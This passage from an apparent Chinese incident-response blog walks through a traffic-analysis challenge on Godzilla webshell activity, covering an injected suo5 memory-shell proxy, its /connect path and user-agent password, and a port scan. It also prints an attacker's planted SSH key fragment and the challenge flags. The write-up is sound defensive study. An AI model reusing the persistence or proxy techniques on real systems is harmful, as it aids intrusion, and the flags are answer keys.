</span><span class="o">-</span><span class="n">d</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="p">.</span><span class="na">bash_h1story</span><span class="o">/</span><span class="p">.</span><span class="na">keys</span></span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">ssh</span><span class="o">-</span><span class="n">rsa</span><span class="w"> </span><span class="n">AAAAB3NzaC1yc2EAAAADAQABAAABgQDPNKP3QL</span><span class="o">+</span><span class="n">i1safdsU6Zb2MuoBjZYreADjwhbP3dzZpjwx8aC7X1k9sb8IEKSjvsWxbb4nC7r</span><span class="o">/</span><span class="n">wzHKHo0bdnwdM6Risjniob6</span><span class="o">+</span><span class="n">0c4ImBzksxvnR3lJjQe5Hw</span><span class="o">+</span><span class="n">wi4</span><span class="o">+</span><span class="n">ynA</span><span class="o">/</span><span class="n">D3U19OazRxca5I1L6ONspSAa3s4sw2QoxbuBVFel</span><span class="o">+</span><span class="n">IKBzebp8K7VB3Kr3Zlry5NTd52Inn347zZWfb56olxRaHTJ6IXAJLeFmGT6R2nDul2lY8HWS2D5k8lDC9oNewTjtFKzPVi9rtDzGHxDc1</span><span class="o">+</span><span class="n">k3gKE2QkKUjBEYfeKmU</span><span class="o">+</span><span class="n">N5GmTT3tIYfrJSfWfxwDrCvvhqnf2wZQYtZCNf48C</span><span class="o">/</span><span class="n">opH8EhRBQrH</span><span class="o">/</span><span class="n">X94drX</span><span class="o">+</span><span class="n">eXJOmozQzKJfdidQshRwSKDff6w1gYk</span><span class="o">=</span><span class="w"> </span><span class="n">xiaole</span><span class="nd">@xiaoledeMacBook</span><span class="o">-</span><span class="n">Pro</span><span class="p">.</span><span class="na">local</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>将公钥内容进行md5提交即可</p>
+<p><img loading="lazy" src="/posts/%E5%93%A5%E6%96%AF%E6%8B%89ekp%E7%89%88%E6%9C%AC%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/images/QQ_1727765095036-20241001144458-9t42e8g.png" alt="QQ_1727765095036" srcset="/posts/%E5%93%A5%E6%96%AF%E6%8B%89ekp%E7%89%88%E6%9C%AC%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/images/QQ_1727765095036-20241001144458-9t42e8g.png?size=small, /posts/%E5%93%A5%E6%96%AF%E6%8B%89ekp%E7%89%88%E6%9C%AC%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/images/QQ_1727765095036-20241001144458-9t42e8g.png?size=medium 1.5x, /posts/%E5%93%A5%E6%96%AF%E6%8B%89ekp%E7%89%88%E6%9C%AC%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/images/QQ_1727765095036-20241001144458-9t42e8g.png?size=large 2x" data-title="QQ_1727765095036" style="--width: 2024px;--aspect-ratio: 2024 / 210;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>​</p>
+<p>flag{d7bf0e27d6f533604250faceb28b6d4b}</p>
+<h2 id="11黑客注入的内存马代理是那种类型的如flagfrp" class="heading-element"><span>11、黑客注入的内存马代理是那种类型的？（如flag{frp}）</span>
+  <a href="#11%e9%bb%91%e5%ae%a2%e6%b3%a8%e5%85%a5%e7%9a%84%e5%86%85%e5%ad%98%e9%a9%ac%e4%bb%a3%e7%90%86%e6%98%af%e9%82%a3%e7%a7%8d%e7%b1%bb%e5%9e%8b%e7%9a%84%e5%a6%82flagfrp" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>先看这里的流量</p>
+<p><img loading="lazy" src="/posts/%E5%93%A5%E6%96%AF%E6%8B%89ekp%E7%89%88%E6%9C%AC%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/images/QQ_1728469751562-20241009182913-0qsjg6j.png" alt="QQ_1728469751562" srcset="/posts/%E5%93%A5%E6%96%AF%E6%8B%89ekp%E7%89%88%E6%9C%AC%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/images/QQ_1728469751562-20241009182913-0qsjg6j.png?size=small, /posts/%E5%93%A5%E6%96%AF%E6%8B%89ekp%E7%89%88%E6%9C%AC%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/images/QQ_1728469751562-20241009182913-0qsjg6j.png?size=medium 1.5x, /posts/%E5%93%A5%E6%96%AF%E6%8B%89ekp%E7%89%88%E6%9C%AC%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/images/QQ_1728469751562-20241009182913-0qsjg6j.png?size=large 2x" data-title="QQ_1728469751562" style="--width: 2152px;--aspect-ratio: 2152 / 1686;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>​</p>
+<p>请求流量，简单通过字符串看出像是注入了什么东西，有user-agent 还有一个路径</p>
+<p><img loading="lazy" src="/posts/%E5%93%A5%E6%96%AF%E6%8B%89ekp%E7%89%88%E6%9C%AC%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/images/QQ_1727852300793-20241002145823-hbsdq5l.png" alt="QQ_1727852300793" srcset="/posts/%E5%93%A5%E6%96%AF%E6%8B%89ekp%E7%89%88%E6%9C%AC%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/images/QQ_1727852300793-20241002145823-hbsdq5l.png?size=small, /posts/%E5%93%A5%E6%96%AF%E6%8B%89ekp%E7%89%88%E6%9C%AC%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/images/QQ_1727852300793-20241002145823-hbsdq5l.png?size=medium 1.5x, /posts/%E5%93%A5%E6%96%AF%E6%8B%89ekp%E7%89%88%E6%9C%AC%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/images/QQ_1727852300793-20241002145823-hbsdq5l.png?size=large 2x" data-title="QQ_1727852300793" style="--width: 1116px;--aspect-ratio: 1116 / 716;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>​</p>
+<p>流量解密，返回ok，应该是注入完成</p>
+<p><img loading="lazy" src="/posts/%E5%93%A5%E6%96%AF%E6%8B%89ekp%E7%89%88%E6%9C%AC%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/images/QQ_1728469782081-20241009182946-omsrduf.png" alt="QQ_1728469782081" srcset="/posts/%E5%93%A5%E6%96%AF%E6%8B%89ekp%E7%89%88%E6%9C%AC%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/images/QQ_1728469782081-20241009182946-omsrduf.png?size=small, /posts/%E5%93%A5%E6%96%AF%E6%8B%89ekp%E7%89%88%E6%9C%AC%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/images/QQ_1728469782081-20241009182946-omsrduf.png?size=medium 1.5x, /posts/%E5%93%A5%E6%96%AF%E6%8B%89ekp%E7%89%88%E6%9C%AC%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/images/QQ_1728469782081-20241009182946-omsrduf.png?size=large 2x" data-title="QQ_1728469782081" style="--width: 1748px;--aspect-ratio: 1748 / 264;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>​</p>
+<p>目前还无法确定具体代理类型(前面几条数据流里有注入使用的代码，大佬看一下就知道了，后面介绍简单的更适合安服的方法)</p>
+<p>flag{suo5}</p>
+<h2 id="12这个代理的路径是什么如flagfrp" class="heading-element"><span>12、这个代理的路径是什么？（如flag{/frp}）</span>
+  <a href="#12%e8%bf%99%e4%b8%aa%e4%bb%a3%e7%90%86%e7%9a%84%e8%b7%af%e5%be%84%e6%98%af%e4%bb%80%e4%b9%88%e5%a6%82flagfrp" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>注入完成后访问了/connect，但是是404</p>
+<p><img loading="lazy" src="/posts/%E5%93%A5%E6%96%AF%E6%8B%89ekp%E7%89%88%E6%9C%AC%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/images/QQ_1728469824826-20241009183028-1xx2rfc.png" alt="QQ_1728469824826" srcset="/posts/%E5%93%A5%E6%96%AF%E6%8B%89ekp%E7%89%88%E6%9C%AC%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/images/QQ_1728469824826-20241009183028-1xx2rfc.png?size=small, /posts/%E5%93%A5%E6%96%AF%E6%8B%89ekp%E7%89%88%E6%9C%AC%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/images/QQ_1728469824826-20241009183028-1xx2rfc.png?size=medium 1.5x, /posts/%E5%93%A5%E6%96%AF%E6%8B%89ekp%E7%89%88%E6%9C%AC%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/images/QQ_1728469824826-20241009183028-1xx2rfc.png?size=large 2x" data-title="QQ_1728469824826" style="--width: 3164px;--aspect-ratio: 3164 / 1012;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>​</p>
+<p>这里开始从http转为tcp连接</p>
+<p><img loading="lazy" src="/posts/%E5%93%A5%E6%96%AF%E6%8B%89ekp%E7%89%88%E6%9C%AC%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/images/QQ_1728469897531-20241009183140-s5tm1ib.png" alt="QQ_1728469897531" srcset="/posts/%E5%93%A5%E6%96%AF%E6%8B%89ekp%E7%89%88%E6%9C%AC%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/images/QQ_1728469897531-20241009183140-s5tm1ib.png?size=small, /posts/%E5%93%A5%E6%96%AF%E6%8B%89ekp%E7%89%88%E6%9C%AC%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/images/QQ_1728469897531-20241009183140-s5tm1ib.png?size=medium 1.5x, /posts/%E5%93%A5%E6%96%AF%E6%8B%89ekp%E7%89%88%E6%9C%AC%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/images/QQ_1728469897531-20241009183140-s5tm1ib.png?size=large 2x" data-title="QQ_1728469897531" style="--width: 3424px;--aspect-ratio: 3424 / 816;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>​</p>
+<p>发现连接了几次都是404</p>
+<p><img loading="lazy" src="/posts/%E5%93%A5%E6%96%AF%E6%8B%89ekp%E7%89%88%E6%9C%AC%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/images/QQ_1728469913335-20241009183154-ccn9f49.png" alt="QQ_1728469913335" srcset="/posts/%E5%93%A5%E6%96%AF%E6%8B%89ekp%E7%89%88%E6%9C%AC%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/images/QQ_1728469913335-20241009183154-ccn9f49.png?size=small, /posts/%E5%93%A5%E6%96%AF%E6%8B%89ekp%E7%89%88%E6%9C%AC%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/images/QQ_1728469913335-20241009183154-ccn9f49.png?size=medium 1.5x, /posts/%E5%93%A5%E6%96%AF%E6%8B%89ekp%E7%89%88%E6%9C%AC%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/images/QQ_1728469913335-20241009183154-ccn9f49.png?size=large 2x" data-title="QQ_1728469913335" style="--width: 2152px;--aspect-ratio: 2152 / 1686;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>​</p>
+<p>而第25个是成功的，观察发现两个请求的user-agent不同，这里就可以看出代理是判断了user-agent头，那就是suo5代理了。路径也就是/connect</p>
+<p><img loading="lazy" src="/posts/%E5%93%A5%E6%96%AF%E6%8B%89ekp%E7%89%88%E6%9C%AC%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/images/QQ_1728469930968-20241009183213-1tkc703.png" alt="QQ_1728469930968" srcset="/posts/%E5%93%A5%E6%96%AF%E6%8B%89ekp%E7%89%88%E6%9C%AC%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/images/QQ_1728469930968-20241009183213-1tkc703.png?size=small, /posts/%E5%93%A5%E6%96%AF%E6%8B%89ekp%E7%89%88%E6%9C%AC%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/images/QQ_1728469930968-20241009183213-1tkc703.png?size=medium 1.5x, /posts/%E5%93%A5%E6%96%AF%E6%8B%89ekp%E7%89%88%E6%9C%AC%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/images/QQ_1728469930968-20241009183213-1tkc703.png?size=large 2x" data-title="QQ_1728469930968" style="--width: 2152px;--aspect-ratio: 2152 / 1686;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>​</p>
+<p>flag{/connect}</p>
+<h2 id="13这个代理的连接密码是什么将得到的密码md5后作为flag提交" class="heading-element"><span>13、这个代理的连接密码是什么？（将得到的密码md5后作为flag提交）</span>
+  <a href="#13%e8%bf%99%e4%b8%aa%e4%bb%a3%e7%90%86%e7%9a%84%e8%bf%9e%e6%8e%a5%e5%af%86%e7%a0%81%e6%98%af%e4%bb%80%e4%b9%88%e5%b0%86%e5%be%97%e5%88%b0%e7%9a%84%e5%af%86%e7%a0%81md5%e5%90%8e%e4%bd%9c%e4%b8%baflag%e6%8f%90%e4%ba%a4" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>将user-agent的值进行md5后提交</p>
+<p><img loading="lazy" src="/posts/%E5%93%A5%E6%96%AF%E6%8B%89ekp%E7%89%88%E6%9C%AC%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/images/QQ_1727854599130-20241002153641-l2jgte4.png" alt="QQ_1727854599130" srcset="/posts/%E5%93%A5%E6%96%AF%E6%8B%89ekp%E7%89%88%E6%9C%AC%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/images/QQ_1727854599130-20241002153641-l2jgte4.png?size=small, /posts/%E5%93%A5%E6%96%AF%E6%8B%89ekp%E7%89%88%E6%9C%AC%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/images/QQ_1727854599130-20241002153641-l2jgte4.png?size=medium 1.5x, /posts/%E5%93%A5%E6%96%AF%E6%8B%89ekp%E7%89%88%E6%9C%AC%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/images/QQ_1727854599130-20241002153641-l2jgte4.png?size=large 2x" data-title="QQ_1727854599130" style="--width: 1914px;--aspect-ratio: 1914 / 622;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>​</p>
+<p>flag{e3c77fd790af8d25fe271cd275eb405e}</p>
+<h2 id="14黑客扫描了哪个ip的哪些端口端口按照文本顺序提交即可-如flagip212223" class="heading-element"><span>14、黑客扫描了哪个ip的哪些端口？（端口按照文本顺序提交即可 如：flag{ip,21,22,23}）</span>
+  <a href="#14%e9%bb%91%e5%ae%a2%e6%89%ab%e6%8f%8f%e4%ba%86%e5%93%aa%e4%b8%aaip%e7%9a%84%e5%93%aa%e4%ba%9b%e7%ab%af%e5%8f%a3%e7%ab%af%e5%8f%a3%e6%8c%89%e7%85%a7%e6%96%87%e6%9c%ac%e9%a1%ba%e5%ba%8f%e6%8f%90%e4%ba%a4%e5%8d%b3%e5%8f%af-%e5%a6%82flagip212223" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>在最后一个流中发现扫描操作</p>
+<p><img loading="lazy" src="/posts/%E5%93%A5%E6%96%AF%E6%8B%89ekp%E7%89%88%E6%9C%AC%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/images/QQ_1728469973056-20241009183254-8n6gfx8.png" alt="QQ_1728469973056" srcset="/posts/%E5%93%A5%E6%96%AF%E6%8B%89ekp%E7%89%88%E6%9C%AC%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/images/QQ_1728469973056-20241009183254-8n6gfx8.png?size=small, /posts/%E5%93%A5%E6%96%AF%E6%8B%89ekp%E7%89%88%E6%9C%AC%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/images/QQ_1728469973056-20241009183254-8n6gfx8.png?size=medium 1.5x, /posts/%E5%93%A5%E6%96%AF%E6%8B%89ekp%E7%89%88%E6%9C%AC%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/images/QQ_1728469973056-20241009183254-8n6gfx8.png?size=large 2x" data-title="QQ_1728469973056" style="--width: 2152px;--aspect-ratio: 2152 / 1686;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>​</p>
+<p><img loading="lazy" src="/posts/%E5%93%A5%E6%96%AF%E6%8B%89ekp%E7%89%88%E6%9C%AC%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/images/QQ_1728470039459-20241009183400-n2bsl47.png" alt="QQ_1728470039459" srcset="/posts/%E5%93%A5%E6%96%AF%E6%8B%89ekp%E7%89%88%E6%9C%AC%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/images/QQ_1728470039459-20241009183400-n2bsl47.png?size=small, /posts/%E5%93%A5%E6%96%AF%E6%8B%89ekp%E7%89%88%E6%9C%AC%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/images/QQ_1728470039459-20241009183400-n2bsl47.png?size=medium 1.5x, /posts/%E5%93%A5%E6%96%AF%E6%8B%89ekp%E7%89%88%E6%9C%AC%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/images/QQ_1728470039459-20241009183400-n2bsl47.png?size=large 2x" data-title="QQ_1728470039459" style="--width: 1692px;--aspect-ratio: 1692 / 454;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>​</p>
+<p>flag{127.0.0.1,873,3306,80,8080,81,8081,21,22,88,8088,8888,1433,443,445,3389,222}</p>
+<h2 id="15黑客扫描到开放的端口有哪些端口从小到大排序提交-如flag212223" class="heading-element"><span>15、黑客扫描到开放的端口有哪些？（端口从小到大排序提交 如：flag{21,22,23}）</span>
+  <a href="#15%e9%bb%91%e5%ae%a2%e6%89%ab%e6%8f%8f%e5%88%b0%e5%bc%80%e6%94%be%e7%9a%84%e7%ab%af%e5%8f%a3%e6%9c%89%e5%93%aa%e4%ba%9b%e7%ab%af%e5%8f%a3%e4%bb%8e%e5%b0%8f%e5%88%b0%e5%a4%a7%e6%8e%92%e5%ba%8f%e6%8f%90%e4%ba%a4-%e5%a6%82flag212223" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>最后为1的是开放端口，0为未开放的端口</p>
+<p><img loading="lazy" src="/posts/%E5%93%A5%E6%96%AF%E6%8B%89ekp%E7%89%88%E6%9C%AC%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/images/QQ_1728470065406-20241009183429-vldjsbg.png" alt="QQ_1728470065406" srcset="/posts/%E5%93%A5%E6%96%AF%E6%8B%89ekp%E7%89%88%E6%9C%AC%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/images/QQ_1728470065406-20241009183429-vldjsbg.png?size=small, /posts/%E5%93%A5%E6%96%AF%E6%8B%89ekp%E7%89%88%E6%9C%AC%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/images/QQ_1728470065406-20241009183429-vldjsbg.png?size=medium 1.5x, /posts/%E5%93%A5%E6%96%AF%E6%8B%89ekp%E7%89%88%E6%9C%AC%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/images/QQ_1728470065406-20241009183429-vldjsbg.png?size=large 2x" data-title="QQ_1728470065406" style="--width: 1722px;--aspect-ratio: 1722 / 648;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>​</p>
+<p>flag{222,8081}</p>
+<p>‍</p>
+</div><div class="post-footer" id="post-footer">
+  <div class="post-info">
+    <div class="post-info-line">
+      <div class="post-info-mod">
+        <span title="Updated on 2024-12-05 21:47:44">Updated on 2024-12-05&nbsp;</span>
+      </div></div><div class="post-info-line">
+        <div class="post-info-md"></div>
+        <div class="post-info-share">
+          <span><a href="javascript:void(0);" title="Share on X" data-sharer="twitter" data-url="http://localhost:1313/posts/%E5%93%A5%E6%96%AF%E6%8B%89ekp%E7%89%88%E6%9C%AC%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/" data-title="哥斯拉ekp版本流量分析" data-hashtags="应急响应,玄机,哥斯拉流量分析"><i class="fa-brands fa-x-twitter fa-fw" aria-hidden="true"></i></a>
+  <a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="http://localhost:1313/posts/%E5%93%A5%E6%96%AF%E6%8B%89ekp%E7%89%88%E6%9C%AC%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/" data-hashtag="应急响应"><i class="fa-brands fa-facebook-square fa-fw" aria-hidden="true"></i></a>
+  <a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="http://localhost:1313/posts/%E5%93%A5%E6%96%AF%E6%8B%89ekp%E7%89%88%E6%9C%AC%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/" data-title="哥斯拉ekp版本流量分析"><i class="fa-brands fa-weibo fa-fw" aria-hidden="true"></i></a>
+  </span>
+        </div>
+      </div></div>
+
+  <div class="post-info-more">
+    <section class="post-tags"><i class="fa-solid fa-tags fa-fw me-1" aria-hidden="true"></i><a href="/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/" class="post-tag" title="Tags - 应急响应">应急响应</a><a href="/tags/%E7%8E%84%E6%9C%BA/" class="post-tag" title="Tags - 玄机">玄机</a><a href="/tags/%E5%93%A5%E6%96%AF%E6%8B%89%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/" class="post-tag" title="Tags - 哥斯拉流量分析">哥斯拉流量分析</a></section>
+    <section>
+      <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+    </section>
+  </div><div class="post-nav"><a href="/posts/%E5%93%A5%E6%96%AF%E6%8B%894.0%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/" class="post-nav-item" rel="prev" title="哥斯拉4.0流量分析"><i class="fa-solid fa-angle-left fa-fw" aria-hidden="true"></i>哥斯拉4.0流量分析</a><a href="/posts/%E6%9F%90%E5%8F%98%E5%BC%82webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/" class="post-nav-item" rel="next" title="某变异Webshell流量分析">某变异Webshell流量分析<i class="fa-solid fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+</article>
+
+  <aside class="toc" id="toc-auto" aria-label="Contents"><h2 class="toc-title">Contents&nbsp;<i class="toc-icon fa-solid fa-angle-down fa-fw" aria-hidden="true"></i></h2>
+      <div class="toc-content" id="toc-content-auto"></div></aside></main><footer class="footer">
